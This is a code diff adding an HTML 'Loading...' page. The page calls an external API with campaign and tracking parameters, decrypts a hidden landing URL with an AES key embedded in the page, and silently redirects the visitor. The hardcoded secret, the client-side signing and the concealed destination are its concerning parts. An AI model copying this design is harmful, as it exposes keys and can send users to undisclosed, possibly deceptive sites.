@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Loading...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html, body {
+            height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background: #F2F2F7;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            padding: 40px 24px;
+            text-align: center;
+        }
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid #E5E5EA;
+            border-top: 4px solid #FF9500;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 24px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .status-text {
+            font-size: 16px;
+            color: #636366;
+            line-height: 1.5;
+            max-width: 280px;
+        }
+        .status-sub {
+            font-size: 13px;
+            color: #8E8E93;
+            margin-top: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <p class="status-text" id="statusText">Processing your request, please wait...</p>
+        <p class="status-sub" id="statusSub"></p>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script>
+    /* ============================================================
+     * Configuration
+     * ============================================================ */
+    var CONFIG = {
+        apiBase: 'https://api.zombifieds.com/api/v2',
+        secretKey: '00fd3c92cecb228f39743ad7a6584062',
+        aesKey: '00fd3c92cecb228f39743ad7a6584062',
+        maxTimeout: 20000,   // 20 seconds max wait
+        retryCount: 0,       // Additional retries on failure
+        retryDelay: 1500     // Delay between retries (ms)
+    };
+
+    /* ============================================================
+     * Utility functions
+     * ============================================================ */
+
+    function getParam(name) {
+        var match = window.location.search.match(new RegExp('[?&]' + name + '=([^&]*)'));
+        return match ? decodeURIComponent(match[1]) : '';
+    }
+
+    function md5(str) {
+        return CryptoJS.MD5(str).toString();
+    }
+
+    function getTs() {
+        return Math.floor(Date.now() / 1000).toString();
+    }
+
+    /**
+     * AES-128-CBC decrypt.
+     * Ciphertext format: base64( IV[16 bytes] + encrypted_data )
+     */
+    function aesDecrypt(encryptedBase64, keyHex) {
+        try {
+            var key = CryptoJS.enc.Hex.parse(keyHex);
+            var rawData = CryptoJS.enc.Base64.parse(encryptedBase64);
+
+            if (rawData.sigBytes < 16) return '';
+
+            // First 16 bytes = IV, rest = ciphertext
+            var iv = CryptoJS.lib.WordArray.create(rawData.words.slice(0, 4), 16);
+            var ciphertext = CryptoJS.lib.WordArray.create(rawData.words.slice(4), rawData.sigBytes - 16);
+
+            var decrypted = CryptoJS.AES.decrypt(
+                CryptoJS.lib.CipherParams.create({ ciphertext: ciphertext }),
+                key,
+                { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 }
+            );
+
+            return decrypted.toString(CryptoJS.enc.Utf8);
+        } catch (e) {
+            return '';
+        }
+    }
+
+    function setStatus(text, isError) {
+        document.getElementById('statusText').textContent = text;
+        if (isError) {
+            document.getElementById('statusText').style.color = '#FF3B30';
+            document.getElementById('statusSub').textContent = '';
+        }
+    }
+
+    /* ============================================================
+     * API Call
+     * ============================================================ */
+
+    function fetchLanding(cId, tId, ts, sign, callback) {
+        var xhr = new XMLHttpRequest();
+        var url = CONFIG.apiBase + '/landing?c_id=' + encodeURIComponent(cId)
+            + '&t_id=' + encodeURIComponent(tId)
+            + '&ts=' + encodeURIComponent(ts)
+            + '&sign=' + encodeURIComponent(sign);
+
+        xhr.open('GET', url, true);
+        xhr.timeout = 15000;
+
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                if (xhr.status === 200) {
+                    try {
+                        var resp = JSON.parse(xhr.responseText);
+                        callback(null, resp);
+                    } catch (e) {
+                        callback(new Error('Invalid response'), null);
+                    }
+                } else {
+                    callback(new Error('HTTP ' + xhr.status), null);
+                }
+            }
+        };
+
+        xhr.onerror = function() {
+            callback(new Error('Network error'), null);
+        };
+
+        xhr.ontimeout = function() {
+            callback(new Error('Request timeout'), null);
+        };
+
+        xhr.send();
+    }
+
+    /* ============================================================
+     * Redirect flow
+     * ============================================================ */
+
+    function redirectToUrl(url) {
+        if (!url) return false;
+
+        // Replace with actual redirect (use location.replace to avoid back-button issues)
+        try {
+            window.location.replace(url);
+            return true;
+        } catch (e) {
+            // Fallback: try location.href
+            try {
+                window.location.href = url;
+                return true;
+            } catch (e2) {
+                return false;
+            }
+        }
+    }
+
+    function tryFetchAndRedirect(attempt) {
+        attempt = attempt || 0;
+
+        var cId = getParam('c_id');
+        var tId = getParam('t_id');
+        var ts  = getParam('ts');
+        var sign = getParam('sign');
+
+        fetchLanding(cId, tId, ts, sign, function(err, resp) {
+            if (err) {
+                // Retry on failure
+                if (attempt < CONFIG.retryCount) {
+                    setTimeout(function() {
+                        tryFetchAndRedirect(attempt + 1);
+                    }, CONFIG.retryDelay);
+                }
+                // Don't change status text on error — let the timer handle it
+                return;
+            }
+
+            if (resp && resp.code === 0 && resp.data) {
+                // Decrypt the data to get real landing URL
+                var landingUrl = aesDecrypt(resp.data, CONFIG.aesKey);
+
+                if (landingUrl) {
+                    // Success — redirect now
+                    redirectToUrl(landingUrl);
+                }
+                // If decrypt failed, keep waiting (timer will handle timeout)
+            }
+            // If code != 0, keep waiting (timer will handle timeout)
+        });
+    }
+
+    /* ============================================================
+     * Entry point
+     * ============================================================ */
+
+    (function() {
+        var cId = getParam('c_id');
+        var tId = getParam('t_id');
+        var ts  = getParam('ts');
+        var sign = getParam('sign');
+
+        // Validate required params
+        if (!cId || !tId) {
+            setStatus('Invalid request. Missing required parameters.', true);
+            document.querySelector('.spinner').style.display = 'none';
+            return;
+        }
+
+        // Auto-generate ts and sign if missing (for flexible usage)
+        if (!ts) {
+            ts = getTs();
+        }
+        if (!sign && CONFIG.secretKey) {
+            sign = md5(cId + tId + ts + CONFIG.secretKey);
+        }
+
+        // Set up the 20-second timeout
+        var timeoutTriggered = false;
+        setTimeout(function() {
+            timeoutTriggered = true;
+            document.querySelector('.spinner').style.display = 'none';
+            setStatus('Loading timed out. Please check your network and try again.', true);
+        }, CONFIG.maxTimeout);
+
+        // Start fetching (retries built-in)
+        tryFetchAndRedirect(0);
+
+    })();
+    </script>
+</body>
+</html>
